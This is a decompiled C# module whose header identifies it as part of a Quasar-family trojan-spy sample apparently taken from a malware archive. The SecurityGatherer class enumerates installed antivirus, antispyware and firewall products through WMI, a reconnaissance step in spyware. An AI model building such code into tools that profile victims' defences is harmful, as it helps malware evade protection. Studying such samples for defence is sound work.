// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.WMI.SecurityGatherer
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.WMI.Enums;
using NoiseMe.Drags.App.Models.WMI.Objects;
using System;
using System.Collections.Generic;
using System.Management;

namespace NoiseMe.Drags.App.Data.WMI
{
  public static class SecurityGatherer
  {
    private static string SecurityScope = Environment.OSVersion.Platform == PlatformID.Win32NT & Environment.OSVersion.Version.Major >= 6 ? "ROOT\\SecurityCenter2" : "ROOT\\SecurityCenter";

    public static ICollection<SecurityProduct> GetSecurityProducts(
      SecurityProductType productType)
    {
      List<SecurityProduct> securityProducts = new List<SecurityProduct>();
      ManagementScope scope = new ManagementScope(SecurityGatherer.SecurityScope);
      string[] properties = new string[2]
      {
        "displayName",
        "pathToSignedProductExe"
      };
      WmiInstanceClassCollection instanceClassCollection;
      switch (productType)
      {
        case SecurityProductType.AntiVirus:
          instanceClassCollection = WmiInstance.Query("AntivirusProduct", properties, scope);
          break;
        case SecurityProductType.AntiSpyware:
          instanceClassCollection = WmiInstance.Query("AntiSpyWareProduct", properties, scope);
          break;
        case SecurityProductType.Firewall:
          instanceClassCollection = WmiInstance.Query("FirewallProduct", properties, scope);
          break;
        default:
          instanceClassCollection = (WmiInstanceClassCollection) null;
          break;
      }
      if (instanceClassCollection == null)
        return (ICollection<SecurityProduct>) securityProducts;
      foreach (WmiInstanceClass wmiInstanceClass in instanceClassCollection)
      {
        SecurityProduct securityProduct = new SecurityProduct((string) wmiInstanceClass["displayName"].Value, (string) wmiInstanceClass["pathToSignedProductExe"].Value);
        securityProducts.Add(securityProduct);
      }
      return (ICollection<SecurityProduct>) securityProducts;
    }
  }
}
